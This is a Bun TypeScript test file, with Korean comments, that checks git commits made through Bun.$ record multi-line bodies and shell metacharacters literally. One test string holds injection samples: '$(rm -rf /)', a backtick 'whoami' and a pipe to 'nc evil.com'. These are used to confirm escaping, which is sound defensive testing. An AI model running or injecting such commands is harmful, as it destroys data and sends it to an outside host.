import { describe, expect, test } from "bun:test"
import { $ } from "bun"
import { mkdtemp, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"

// Spike 4: Bun.$ git commit roundtrip 검증.
// state/ 디렉토리 시뮬레이션을 위해 temp 디렉토리에 별도 git repo를 만들고
// Bun.$ 가 multi-line commit body를 정상 기록하는지 확인.

describe("Spike 4: Bun.$ git commit (BOOT-01)", () => {
  test("--allow-empty + body 포함 commit이 git log에 표시됨", async () => {
    const dir = await mkdtemp(join(tmpdir(), "gons-spike4-"))
    try {
      await $`git init -q`.cwd(dir)
      await $`git config user.email "spike@example.com"`.cwd(dir)
      await $`git config user.name "Spike Test"`.cwd(dir)
      await $`git config commit.gpgsign false`.cwd(dir)

      const subject = "feat(spike4): empty commit with body"
      const body = "사용자 요청: ais-prod redis 메모리 확인\n\nAI reasoning: docker stats 출력 분석"

      // Bun.$ 가 multi-line body를 escape 없이 처리하는지 검증.
      // 실제 Phase 2에서는 동일 패턴으로 user prompt + AI reasoning을 commit.
      await $`git commit --allow-empty -m ${subject} -m ${body}`.cwd(dir)

      const log = await $`git log -1 --format=%s%n---%n%b`.cwd(dir).text()

      expect(log).toContain(subject)
      expect(log).toContain("ais-prod redis 메모리 확인")
      expect(log).toContain("AI reasoning: docker stats 출력 분석")
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  test("shell metachar(파이프, 백틱)이 포함된 body가 escape 없이 commit됨", async () => {
    const dir = await mkdtemp(join(tmpdir(), "gons-spike4-meta-"))
    try {
      await $`git init -q`.cwd(dir)
      await $`git config user.email "spike@example.com"`.cwd(dir)
      await $`git config user.name "Spike Test"`.cwd(dir)
      await $`git config commit.gpgsign false`.cwd(dir)

      // Phase 2 APPLY-06 검증과 직접 연결: shell metachar escape.
      const dangerous = "user typed: $(rm -rf /) and `whoami` and | nc evil.com"

      await $`git commit --allow-empty -m "test" -m ${dangerous}`.cwd(dir)
      const body = await $`git log -1 --format=%b`.cwd(dir).text()

      expect(body).toContain("$(rm -rf /)")
      expect(body).toContain("`whoami`")
      expect(body).toContain("| nc evil.com")
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })
})
